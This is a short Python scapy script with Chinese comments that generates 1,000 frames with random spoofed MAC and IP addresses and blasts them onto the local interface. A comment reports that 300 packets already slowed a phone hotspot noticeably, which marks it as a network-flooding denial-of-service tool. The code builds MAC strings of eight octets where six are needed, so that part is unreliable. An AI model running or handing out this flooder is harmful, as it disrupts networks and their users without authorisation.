import random
from randmac import RandMac
from scapy.all import *
def pack():
    a=1 #初始化运行条件
    b=0 #初始化正确数据包构造次数
    datt_list=[] #初始化发射数据包列表
    while a:
        # dstmac=str(RandMac())
        # srcmac=str(RandMac())
        dstmac=''
        srcmac=''
        seedd=['0','1','2','3','4','5','6','7','8','9',"a","b","c","d","e","f"]
        for i in range(1,17):
            dstmac+=random.choice(seedd)#构造目标mac地址
            srcmac+=random.choice(seedd)#构造源mac地址
            if i%2 == 0 and i != 16:
                dstmac+=":"
                srcmac+=":"
        dstip=str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))
        srcip="192"+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))
        if b<1000: #如果计数器次数没有满1000则继续填充 实测300条数据就可以时手机热点感到明显的延时
            datt=Ether(src=srcmac,dst=dstmac)/IP(src=srcip,dst=dstip)
            datt_list.append(datt)
            b+=1 #计数器加1
        else: #如果已经构造了指定次数据，则使运行条件为假
            a=0
    return datt_list
def send(data):
    sendp(data,iface="eth0")
 
if __name__ == "__main__":
    data=pack()
    send(data)
    print(str(data))